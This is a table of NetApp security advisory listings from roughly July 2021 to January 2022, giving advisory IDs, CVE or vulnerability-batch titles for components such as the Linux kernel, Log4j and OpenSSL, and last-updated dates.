| [**NTAP-20220121-0001**](https://security.netapp.com/advisory/ntap-20220121-0001/) | CVE-2021-45485 Linux Kernel Vulnerability in NetApp Products | 2023-05-22 |
| [**NTAP-20220121-0004**](https://security.netapp.com/advisory/ntap-20220121-0004/) | CVE-2021-45960 Expat Vulnerability in NetApp Products | 2022-08-29 |
| [**NTAP-20220121-0006**](https://security.netapp.com/advisory/ntap-20220121-0006/) | CVE-2021-46143 Expat Vulnerability in NetApp Products | 2023-02-10 |
| [**NTAP-20220121-0005**](https://security.netapp.com/advisory/ntap-20220121-0005/) | January 2022 Django Vulnerabilities in NetApp Products | 2022-01-25 |
| [**NTAP-20220121-0007**](https://security.netapp.com/advisory/ntap-20220121-0007/) | January 2022 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-02-29 |
| [**NTAP-20220121-0008**](https://security.netapp.com/advisory/ntap-20220121-0008/) | January 2022 MySQL Server Vulnerabilities in NetApp Products | 2022-09-01 |
| [**NTAP-20220119-0001**](https://security.netapp.com/advisory/ntap-20220119-0001/) | CVE-2021-42392 H2 Database Vulnerability in NetApp Products | 2022-01-19 |
| [**NTAP-20220114-0001**](https://security.netapp.com/advisory/ntap-20220114-0001/) | CVE-2021-38931 IBM DB2 Vulnerability in NetApp Products | 2022-01-14 |
| [**NTAP-20220114-0005**](https://security.netapp.com/advisory/ntap-20220114-0005/) | CVE-2021-44548 Apache Solr Vulnerability in NetApp Products | 2022-01-14 |
| [**NTAP-20220114-0002**](https://security.netapp.com/advisory/ntap-20220114-0002/) | December 2021 IBM DB2 Vulnerabilities in NetApp Products | 2022-06-27 |
| [**NTAP-20220114-0003**](https://security.netapp.com/advisory/ntap-20220114-0003/) | January 2022 Linux Kernel Vulnerabilities in NetApp Products | 2022-06-09 |
| [**NTAP-20220114-0004**](https://security.netapp.com/advisory/ntap-20220114-0004/) | January 2022 X.Org X Server Vulnerabilities in NetApp Products | 2022-01-21 |
| [**NTAP-20220110-0002**](https://security.netapp.com/advisory/ntap-20220110-0002/) | CVE-2021-20316 Samba Vulnerability in NetApp Products | 2022-01-10 |
| [**NTAP-20220110-0001**](https://security.netapp.com/advisory/ntap-20220110-0001/) | CVE-2021-43566 Samba Vulnerability in NetApp Products | 2022-01-10 |
| [**NTAP-20220107-0003**](https://security.netapp.com/advisory/ntap-20220107-0003/) | CVE-2021-43797 Apache Netty Vulnerability in NetApp Products | 2022-09-01 |
| [**NTAP-20220107-0005**](https://security.netapp.com/advisory/ntap-20220107-0005/) | CVE-2021-43818 lxml Vulnerability in NetApp Products | 2022-06-02 |
| [**NTAP-20220107-0002**](https://security.netapp.com/advisory/ntap-20220107-0002/) | CVE-2021-45078 GNU Binutils Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20220107-0001**](https://security.netapp.com/advisory/ntap-20220107-0001/) | CVE-2021-45100 Linux Kernel Vulnerability in NetApp Products | 2022-02-16 |
| [**NTAP-20220107-0004**](https://security.netapp.com/advisory/ntap-20220107-0004/) | CVE-2021-45459 Node.js Vulnerability in NetApp Products | 2022-02-02 |
| [**NTAP-20220107-0006**](https://security.netapp.com/advisory/ntap-20220107-0006/) | January 2022 Grafana Vulnerabilities in NetApp Products | 2022-01-27 |
| [**NTAP-20220104-0001**](https://security.netapp.com/advisory/ntap-20220104-0001/) | CVE-2021-44832 Apache Log4j Vulnerability in NetApp Products | 2022-01-31 |
| [**NTAP-20211229-0005**](https://security.netapp.com/advisory/ntap-20211229-0005/) | CVE-2018-25020 Linux Kernel Vulnerability in NetApp Products | 2022-02-16 |
| [**NTAP-20211229-0003**](https://security.netapp.com/advisory/ntap-20211229-0003/) | CVE-2021-4044 OpenSSL Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20211229-0007**](https://security.netapp.com/advisory/ntap-20211229-0007/) | CVE-2021-41805 HashiCorp Consul Vulnerability in NetApp Products | 2021-12-29 |
| [**NTAP-20211229-0001**](https://security.netapp.com/advisory/ntap-20211229-0001/) | CVE-2021-42550 Logback Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20211229-0002**](https://security.netapp.com/advisory/ntap-20211229-0002/) | CVE-2021-43527 Libnss Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20211229-0006**](https://security.netapp.com/advisory/ntap-20211229-0006/) | CVE-2021-44420 Django Vulnerability in NetApp Products | 2022-01-25 |
| [**NTAP-20211229-0004**](https://security.netapp.com/advisory/ntap-20211229-0004/) | December 2021 Grafana Vulnerabilities in NetApp Products | 2022-01-05 |
| [**NTAP-20211224-0001**](https://security.netapp.com/advisory/ntap-20211224-0001/) | December 2021 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-01-28 |
| [**NTAP-20211223-0003**](https://security.netapp.com/advisory/ntap-20211223-0003/) | CVE-2017-5123 Linux Kernel Vulnerability in NetApp Products | 2022-01-07 |
| [**NTAP-20211223-0005**](https://security.netapp.com/advisory/ntap-20211223-0005/) | CVE-2021-21707 PHP Vulnerability in NetApp Products | 2022-06-07 |
| [**NTAP-20211223-0004**](https://security.netapp.com/advisory/ntap-20211223-0004/) | CVE-2021-23732 Node.js Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211223-0008**](https://security.netapp.com/advisory/ntap-20211223-0008/) | CVE-2021-27007 Remote Code Execution Vulnerability in NetApp Virtual Desktop Service (VDS) | 2021-12-23 |
| [**NTAP-20211223-0007**](https://security.netapp.com/advisory/ntap-20211223-0007/) | CVE-2021-4104 Apache Log4j Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211223-0001**](https://security.netapp.com/advisory/ntap-20211223-0001/) | CVE-2021-41244 Grafana Vulnerability in NetApp Products | 2021-12-23 |
| [**NTAP-20211223-0002**](https://security.netapp.com/advisory/ntap-20211223-0002/) | November 2021 BusyBox Vulnerabilities in NetApp Products | 2022-02-16 |
| [**NTAP-20211223-0006**](https://security.netapp.com/advisory/ntap-20211223-0006/) | November 2021 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2022-04-01 |
| [**NTAP-20211221-0001**](https://security.netapp.com/advisory/ntap-20211221-0001/) | CVE-2021-27006 Privilege Escalation Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2021-12-21 |
| [**NTAP-20211218-0001**](https://security.netapp.com/advisory/ntap-20211218-0001/) | CVE-2021-45105 Apache Log4j Vulnerability in NetApp Products | 2022-06-21 |
| [**NTAP-20211215-0001**](https://security.netapp.com/advisory/ntap-20211215-0001/) | CVE-2021-45046 Apache Log4j Vulnerability in NetApp Products | 2022-06-21 |
| [**NTAP-20211210-0002**](https://security.netapp.com/advisory/ntap-20211210-0002/) | CVE-2021-43616 NPM Vulnerability in NetApp Products | 2022-03-15 |
| [**NTAP-20211210-0007**](https://security.netapp.com/advisory/ntap-20211210-0007/) | CVE-2021-44228 Apache Log4j Vulnerability in NetApp Products | 2022-06-21 |
| [**NTAP-20211210-0006**](https://security.netapp.com/advisory/ntap-20211210-0006/) | Intel SA-00528 Intel Processor Vulnerability in NetApp Products | 2022-01-25 |
| [**NTAP-20211210-0004**](https://security.netapp.com/advisory/ntap-20211210-0004/) | Intel SA-00554 Ethernet Controller Vulnerabilities in NetApp Products | 2021-12-11 |
| [**NTAP-20211210-0005**](https://security.netapp.com/advisory/ntap-20211210-0005/) | Intel SA-00555 Ethernet Controller Vulnerabilities in NetApp Products | 2021-12-11 |
| [**NTAP-20211210-0003**](https://security.netapp.com/advisory/ntap-20211210-0003/) | November 2021 Golang Vulnerabilities in NetApp Products | 2022-02-02 |
| [**NTAP-20211210-0001**](https://security.netapp.com/advisory/ntap-20211210-0001/) | November 2021 Linux Kernel Vulnerabilities in NetApp Products | 2022-02-16 |
| [**NTAP-20211206-0001**](https://security.netapp.com/advisory/ntap-20211206-0001/) | November 2021 Samba Vulnerabilities in NetApp Products | 2021-12-06 |
| [**NTAP-20211203-0005**](https://security.netapp.com/advisory/ntap-20211203-0005/) | CVE-2021-23718 Node.js Vulnerability in NetApp Products | 2022-01-07 |
| [**NTAP-20211203-0001**](https://security.netapp.com/advisory/ntap-20211203-0001/) | CVE-2021-25742 Kubernetes Vulnerability in NetApp Products | 2022-02-02 |
| [**NTAP-20211203-0003**](https://security.netapp.com/advisory/ntap-20211203-0003/) | CVE-2021-3715 Linux Kernel Vulnerability in NetApp Products | 2022-04-19 |
| [**NTAP-20211203-0004**](https://security.netapp.com/advisory/ntap-20211203-0004/) | CVE-2021-41229 BlueZ Vulnerability in NetApp Products | 2021-12-03 |
| [**NTAP-20211203-0002**](https://security.netapp.com/advisory/ntap-20211203-0002/) | November 2021 BlueZ Vulnerabilities in NetApp Products | 2021-12-03 |
| [**NTAP-20211125-0004**](https://security.netapp.com/advisory/ntap-20211125-0004/) | CVE-2011-1075 FreeBSD Vulnerability in NetApp Products | 2022-01-21 |
| [**NTAP-20211125-0005**](https://security.netapp.com/advisory/ntap-20211125-0005/) | CVE-2021-22096 Spring Framework Vulnerability in NetApp Products | 2022-12-23 |
| [**NTAP-20211125-0003**](https://security.netapp.com/advisory/ntap-20211125-0003/) | CVE-2021-41174 Grafana Vulnerability in NetApp Products | 2021-12-08 |
| [**NTAP-20211125-0001**](https://security.netapp.com/advisory/ntap-20211125-0001/) | CVE-2021-43057 Linux Kernel Vulnerability in NetApp Products | 2022-04-19 |
| [**NTAP-20211125-0002**](https://security.netapp.com/advisory/ntap-20211125-0002/) | CVE-2021-43267 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211118-0003**](https://security.netapp.com/advisory/ntap-20211118-0003/) | CVE-2021-21703 PHP Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211118-0002**](https://security.netapp.com/advisory/ntap-20211118-0002/) | CVE-2021-25219 ISC BIND Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211118-0006**](https://security.netapp.com/advisory/ntap-20211118-0006/) | CVE-2021-38297 Golang Vulnerability in NetApp Products | 2022-02-02 |
| [**NTAP-20211118-0005**](https://security.netapp.com/advisory/ntap-20211118-0005/) | CVE-2021-42327 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211118-0001**](https://security.netapp.com/advisory/ntap-20211118-0001/) | CVE-2021-42739 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211118-0004**](https://security.netapp.com/advisory/ntap-20211118-0004/) | October 2021 jQuery Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20211112-0002**](https://security.netapp.com/advisory/ntap-20211112-0002/) | CVE-2021-22930 Node.js Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211112-0006**](https://security.netapp.com/advisory/ntap-20211112-0006/) | CVE-2021-42252 Linux Kernel Vulnerability in NetApp Products | 2022-02-21 |
| [**NTAP-20211112-0004**](https://security.netapp.com/advisory/ntap-20211112-0004/) | Intel SA-00562 BIOS Firmware Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20211112-0001**](https://security.netapp.com/advisory/ntap-20211112-0001/) | May 2021 Libwebp Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20211112-0005**](https://security.netapp.com/advisory/ntap-20211112-0005/) | October 2021 IBM Cognos Analytics Vulnerabilities in NetApp Products | 2022-04-01 |
| [**NTAP-20211112-0003**](https://security.netapp.com/advisory/ntap-20211112-0003/) | October 2021 PostgreSQL Vulnerabilities in NetApp Products | 2021-11-12 |
| [**NTAP-20211104-0008**](https://security.netapp.com/advisory/ntap-20211104-0008/) | CVE-2021-33910 Systemd Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211104-0005**](https://security.netapp.com/advisory/ntap-20211104-0005/) | CVE-2021-3520 lz4 Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211104-0006**](https://security.netapp.com/advisory/ntap-20211104-0006/) | CVE-2021-3580 Nettle Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211104-0007**](https://security.netapp.com/advisory/ntap-20211104-0007/) | CVE-2021-36222 MIT Kerberos 5 Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211104-0002**](https://security.netapp.com/advisory/ntap-20211104-0002/) | CVE-2021-42008 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211104-0001**](https://security.netapp.com/advisory/ntap-20211104-0001/) | CVE-2021-42340 Apache Tomcat Vulnerability in NetApp Products | 2022-09-09 |
| [**NTAP-20211104-0004**](https://security.netapp.com/advisory/ntap-20211104-0004/) | October 2021 Libwebp Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20211104-0003**](https://security.netapp.com/advisory/ntap-20211104-0003/) | October 2021 Redis Vulnerabilities in NetApp Products | 2021-11-04 |
| [**NTAP-20211029-0007**](https://security.netapp.com/advisory/ntap-20211029-0007/) | CVE-2021-21706 PHP Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211029-0010**](https://security.netapp.com/advisory/ntap-20211029-0010/) | CVE-2021-23449 NPM Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211029-0001**](https://security.netapp.com/advisory/ntap-20211029-0001/) | CVE-2021-27004 Sensitive Information Disclosure Vulnerability in System Manager 9.x | 2021-10-29 |
| [**NTAP-20211029-0002**](https://security.netapp.com/advisory/ntap-20211029-0002/) | CVE-2021-27005 Denial of Service Vulnerability in Clustered Data ONTAP | 2021-10-29 |
| [**NTAP-20211029-0008**](https://security.netapp.com/advisory/ntap-20211029-0008/) | CVE-2021-39226 Grafana Vulnerability in NetApp Products | 2021-10-29 |
| [**NTAP-20211029-0004**](https://security.netapp.com/advisory/ntap-20211029-0004/) | CVE-2021-41864 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211029-0009**](https://security.netapp.com/advisory/ntap-20211029-0009/) | October 2021 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20211029-0003**](https://security.netapp.com/advisory/ntap-20211029-0003/) | September 2021 cURL/libcURL Vulnerabilities in NetApp Products | 2022-02-01 |
| [**NTAP-20211029-0005**](https://security.netapp.com/advisory/ntap-20211029-0005/) | September 2021 IBM Db2 Vulnerabilities in NetApp Products | 2021-10-29 |
| [**NTAP-20211029-0006**](https://security.netapp.com/advisory/ntap-20211029-0006/) | September 2021 PHP Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20211022-0002**](https://security.netapp.com/advisory/ntap-20211022-0002/) | CVE-2021-20305 Nettle Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20211022-0005**](https://security.netapp.com/advisory/ntap-20211022-0005/) | CVE-2021-35597 MySQL Client Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20211022-0001**](https://security.netapp.com/advisory/ntap-20211022-0001/) | July 2021 Apache Commons Compress Vulnerabilities in NetApp Products | 2022-08-03 |
| [**NTAP-20211022-0004**](https://security.netapp.com/advisory/ntap-20211022-0004/) | October 2021 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20211022-0003**](https://security.netapp.com/advisory/ntap-20211022-0003/) | October 2021 MySQL Server Vulnerabilities in NetApp Products | 2022-08-29 |
| [**NTAP-20211018-0001**](https://security.netapp.com/advisory/ntap-20211018-0001/) | CVE-2021-27001 Arbitrary Data Modification Vulnerability in Clustered Data ONTAP | 2021-10-19 |
| [**NTAP-20211014-0005**](https://security.netapp.com/advisory/ntap-20211014-0005/) | CVE-2016-20012 OpenSSH Vulnerability in NetApp Products | 2022-05-04 |
| [**NTAP-20211014-0002**](https://security.netapp.com/advisory/ntap-20211014-0002/) | CVE-2020-8561 Kubernetes Vulnerability in NetApp Products | 2021-10-14 |
| [**NTAP-20211014-0001**](https://security.netapp.com/advisory/ntap-20211014-0001/) | CVE-2021-25740 Kubernetes Vulnerability in NetApp Products | 2021-10-14 |
| [**NTAP-20211014-0003**](https://security.netapp.com/advisory/ntap-20211014-0003/) | CVE-2021-41073 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211014-0004**](https://security.netapp.com/advisory/ntap-20211014-0004/) | CVE-2021-41617 OpenSSH Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20211012-0001**](https://security.netapp.com/advisory/ntap-20211012-0001/) | CVE-2021-27003 X-Frame-Options Header Vulnerability in Clustered Data ONTAP | 2021-10-12 |
| [**NTAP-20211011-0001**](https://security.netapp.com/advisory/ntap-20211011-0001/) | CVE-2021-27002 Sensitive Information Disclosure Vulnerability in NetApp Cloud Manager | 2021-10-11 |
| [**NTAP-20211008-0002**](https://security.netapp.com/advisory/ntap-20211008-0002/) | CVE-2021-22147 Elasticsearch Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211008-0006**](https://security.netapp.com/advisory/ntap-20211008-0006/) | CVE-2021-25741 Kubernetes Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211008-0003**](https://security.netapp.com/advisory/ntap-20211008-0003/) | CVE-2021-38300 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211008-0001**](https://security.netapp.com/advisory/ntap-20211008-0001/) | CVE-2021-40839 Python Vulnerability in NetApp Products | 2023-01-17 |
| [**NTAP-20211008-0005**](https://security.netapp.com/advisory/ntap-20211008-0005/) | CVE-2021-41079 Apache Tomcat Vulnerability in NetApp Products | 2022-01-05 |
| [**NTAP-20211008-0004**](https://security.netapp.com/advisory/ntap-20211008-0004/) | September 2021 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-11-28 |
| [**NTAP-20211004-0002**](https://security.netapp.com/advisory/ntap-20211004-0002/) | CVE-2018-16871 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211004-0004**](https://security.netapp.com/advisory/ntap-20211004-0004/) | CVE-2021-25737 Kubernetes Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20211004-0003**](https://security.netapp.com/advisory/ntap-20211004-0003/) | CVE-2021-3634 libssh Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20211004-0001**](https://security.netapp.com/advisory/ntap-20211004-0001/) | CVE-2021-40490 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20211004-0005**](https://security.netapp.com/advisory/ntap-20211004-0005/) | September 2021 LibTIFF Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210923-0001**](https://security.netapp.com/advisory/ntap-20210923-0001/) | August 2021 Node.js Vulnerabilities in NetApp Products | 2024-05-09 |
| [**NTAP-20210923-0003**](https://security.netapp.com/advisory/ntap-20210923-0003/) | August 2021 XStream Vulnerabilities in NetApp Products | 2021-10-08 |
| [**NTAP-20210923-0005**](https://security.netapp.com/advisory/ntap-20210923-0005/) | CVE-2021-29630 FreeBSD Vulnerability in NetApp Products | 2022-01-21 |
| [**NTAP-20210923-0004**](https://security.netapp.com/advisory/ntap-20210923-0004/) | CVE-2021-29631 FreeBSD Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210923-0006**](https://security.netapp.com/advisory/ntap-20210923-0006/) | CVE-2021-3713 QEMU Vulnerability in NetApp Products | 2021-09-23 |
| [**NTAP-20210923-0002**](https://security.netapp.com/advisory/ntap-20210923-0002/) | CVE-2021-37750 MIT Kerberos 5 Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210917-0006**](https://security.netapp.com/advisory/ntap-20210917-0006/) | CVE-2020-5398 Spring Framework Vulnerability in NetApp Products | 2021-09-17 |
| [**NTAP-20210917-0003**](https://security.netapp.com/advisory/ntap-20210917-0003/) | CVE-2021-22939 Node.js Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210917-0002**](https://security.netapp.com/advisory/ntap-20210917-0002/) | CVE-2021-30468 Apache CXF Vulnerability in NetApp Products | 2022-07-01 |
| [**NTAP-20210917-0001**](https://security.netapp.com/advisory/ntap-20210917-0001/) | CVE-2021-31810 Ruby Vulnerability in NetApp Products | 2021-10-13 |
| [**NTAP-20210917-0004**](https://security.netapp.com/advisory/ntap-20210917-0004/) | CVE-2021-33193 Apache HTTP Server Vulnerability in NetApp Products | 2023-05-22 |
| [**NTAP-20210917-0005**](https://security.netapp.com/advisory/ntap-20210917-0005/) | CVE-2021-37576 Linux Kernel Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20210909-0004**](https://security.netapp.com/advisory/ntap-20210909-0004/) | CVE-2020-22403 Node.js Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20210909-0002**](https://security.netapp.com/advisory/ntap-20210909-0002/) | CVE-2021-25218 ISC BIND Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210909-0003**](https://security.netapp.com/advisory/ntap-20210909-0003/) | CVE-2021-36770 Perl Vulnerability in NetApp Products | 2024-05-09 |
| [**NTAP-20210909-0001**](https://security.netapp.com/advisory/ntap-20210909-0001/) | CVE-2021-38166 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210909-0005**](https://security.netapp.com/advisory/ntap-20210909-0005/) | CVE-2021-38604 GNU C Library (glibc) Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210902-0003**](https://security.netapp.com/advisory/ntap-20210902-0003/) | August 2021 cURL/libcURL Vulnerabilities in NetApp Products | 2022-06-29 |
| [**NTAP-20210902-0010**](https://security.netapp.com/advisory/ntap-20210902-0010/) | August 2021 Linux Kernel 5.13.4 Vulnerabilities in NetApp Products | 2022-05-12 |
| [**NTAP-20210902-0004**](https://security.netapp.com/advisory/ntap-20210902-0004/) | August 2021 Ruby Vulnerabilities in NetApp Products | 2021-09-02 |
| [**NTAP-20210902-0009**](https://security.netapp.com/advisory/ntap-20210902-0009/) | CVE-2012-2666 Golang Vulnerability in NetApp Products | 2021-09-02 |
| [**NTAP-20210902-0008**](https://security.netapp.com/advisory/ntap-20210902-0008/) | CVE-2021-29657 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210902-0005**](https://security.netapp.com/advisory/ntap-20210902-0005/) | CVE-2021-33195 Golang Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210902-0006**](https://security.netapp.com/advisory/ntap-20210902-0006/) | CVE-2021-3682 QEMU Vulnerability in NetApp Products | 2021-09-02 |
| [**NTAP-20210902-0002**](https://security.netapp.com/advisory/ntap-20210902-0002/) | CVE-2021-37600 Util-linux Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210902-0007**](https://security.netapp.com/advisory/ntap-20210902-0007/) | CVE-2021-38207 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210902-0001**](https://security.netapp.com/advisory/ntap-20210902-0001/) | July 2021 Apache HTTP Server Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210827-0010**](https://security.netapp.com/advisory/ntap-20210827-0010/) | August 2021 OpenSSL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210827-0001**](https://security.netapp.com/advisory/ntap-20210827-0001/) | CVE-2020-10727 Apache ActiveMQ Artemis Vulnerability in NetApp Products | 2021-08-27 |
| [**NTAP-20210827-0003**](https://security.netapp.com/advisory/ntap-20210827-0003/) | CVE-2020-10771 Infinispan Vulnerability in NetApp Products | 2021-08-27 |
| [**NTAP-20210827-0002**](https://security.netapp.com/advisory/ntap-20210827-0002/) | CVE-2021-26118 Apache ActiveMQ Artemis Vulnerability in NetApp Products | 2021-08-27 |
| [**NTAP-20210827-0004**](https://security.netapp.com/advisory/ntap-20210827-0004/) | CVE-2021-32761 Redis Vulnerability in NetApp Products | 2021-10-22 |
| [**NTAP-20210827-0005**](https://security.netapp.com/advisory/ntap-20210827-0005/) | CVE-2021-35942 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210827-0009**](https://security.netapp.com/advisory/ntap-20210827-0009/) | Intel SA-00479 Ethernet Controller Vulnerabilities in NetApp Products | 2021-08-27 |
| [**NTAP-20210827-0008**](https://security.netapp.com/advisory/ntap-20210827-0008/) | Intel SA-00515 Ethernet Controller Vulnerabilities in NetApp Products | 2021-08-30 |
| [**NTAP-20210827-0007**](https://security.netapp.com/advisory/ntap-20210827-0007/) | July 2021 Apache Tomcat Vulnerabilities in NetApp Products | 2021-10-22 |
| [**NTAP-20210827-0006**](https://security.netapp.com/advisory/ntap-20210827-0006/) | July 2021 Elasticsearch Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210819-0005**](https://security.netapp.com/advisory/ntap-20210819-0005/) | CVE-2021-22146 Elasticsearch Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210819-0004**](https://security.netapp.com/advisory/ntap-20210819-0004/) | CVE-2021-33909 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210819-0006**](https://security.netapp.com/advisory/ntap-20210819-0006/) | CVE-2021-34429 Eclipse Jetty Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210819-0003**](https://security.netapp.com/advisory/ntap-20210819-0003/) | CVE-2021-37159 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210819-0007**](https://security.netapp.com/advisory/ntap-20210819-0007/) | July 2021 Apache Ant Vulnerabilities in NetApp Products | 2022-08-03 |
| [**NTAP-20210819-0001**](https://security.netapp.com/advisory/ntap-20210819-0001/) | July 2021 Brocade Fabric OS Vulnerabilities in NetApp Products | 2021-08-19 |
| [**NTAP-20210819-0002**](https://security.netapp.com/advisory/ntap-20210819-0002/) | May 2021 Brocade Fabric OS Vulnerabilities in NetApp Products | 2021-08-19 |
| [**NTAP-20210813-0001**](https://security.netapp.com/advisory/ntap-20210813-0001/) | CVE-2021-31535 X.Org X Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210813-0002**](https://security.netapp.com/advisory/ntap-20210813-0002/) | CVE-2021-32078 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210813-0003**](https://security.netapp.com/advisory/ntap-20210813-0003/) | CVE-2021-34428 Eclipse Jetty Vulnerability in NetApp Products | 2022-11-09 |
| [**NTAP-20210813-0005**](https://security.netapp.com/advisory/ntap-20210813-0005/) | CVE-2021-34558 Golang Vulnerability in NetApp Products | 2022-03-03 |
| [**NTAP-20210813-0004**](https://security.netapp.com/advisory/ntap-20210813-0004/) | CVE-2021-35039 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210805-0006**](https://security.netapp.com/advisory/ntap-20210805-0006/) | CVE-2017-20005 NGINX Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210805-0001**](https://security.netapp.com/advisory/ntap-20210805-0001/) | CVE-2020-28097 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210805-0010**](https://security.netapp.com/advisory/ntap-20210805-0010/) | CVE-2021-22555 Linux Kernel Vulnerability in NetApp Products | 2023-08-03 |
| [**NTAP-20210805-0011**](https://security.netapp.com/advisory/ntap-20210805-0011/) | CVE-2021-26998 Sensitive Information Disclosure Vulnerability in NetApp Cloud Manager | 2021-08-05 |
| [**NTAP-20210805-0012**](https://security.netapp.com/advisory/ntap-20210805-0012/) | CVE-2021-26999 Sensitive Information Disclosure Vulnerability in NetApp Cloud Manager | 2021-08-05 |
| [**NTAP-20210805-0002**](https://security.netapp.com/advisory/ntap-20210805-0002/) | CVE-2021-28691 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210805-0008**](https://security.netapp.com/advisory/ntap-20210805-0008/) | CVE-2021-35042 Django Vulnerability in NetApp Products | 2021-08-05 |
| [**NTAP-20210805-0007**](https://security.netapp.com/advisory/ntap-20210805-0007/) | CVE-2021-3541 Libxml2 Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210805-0005**](https://security.netapp.com/advisory/ntap-20210805-0005/) | CVE-2021-3612 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210805-0003**](https://security.netapp.com/advisory/ntap-20210805-0003/) | July 2021 Node.js Vulnerabilities in NetApp Products | 2021-11-17 |
| [**NTAP-20210805-0004**](https://security.netapp.com/advisory/ntap-20210805-0004/) | July 2021 QEMU Vulnerabilities in NetApp Products | 2021-08-05 |
| [**NTAP-20210805-0009**](https://security.netapp.com/advisory/ntap-20210805-0009/) | June 2021 Ruby Vulnerabilities in NetApp Products | 2021-08-05 |
| [**NTAP-20210727-0003**](https://security.netapp.com/advisory/ntap-20210727-0003/) | CVE-2002-2438 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210727-0002**](https://security.netapp.com/advisory/ntap-20210727-0002/) | CVE-2013-4536 QEMU Vulnerability in NetApp Products | 2021-07-27 |
| [**NTAP-20210727-0001**](https://security.netapp.com/advisory/ntap-20210727-0001/) | CVE-2019-12067 QEMU Vulnerability in NetApp Products | 2021-07-27 |
| [**NTAP-20210727-0010**](https://security.netapp.com/advisory/ntap-20210727-0010/) | CVE-2020-25097 Squid Vulnerability in NetApp Products | 2021-09-27 |
| [**NTAP-20210727-0006**](https://security.netapp.com/advisory/ntap-20210727-0006/) | CVE-2020-36387 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210727-0005**](https://security.netapp.com/advisory/ntap-20210727-0005/) | CVE-2021-20293 RESTEasy Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20210727-0009**](https://security.netapp.com/advisory/ntap-20210727-0009/) | CVE-2021-28169 Eclipse Jetty Vulnerability in NetApp Products | 2024-05-01 |
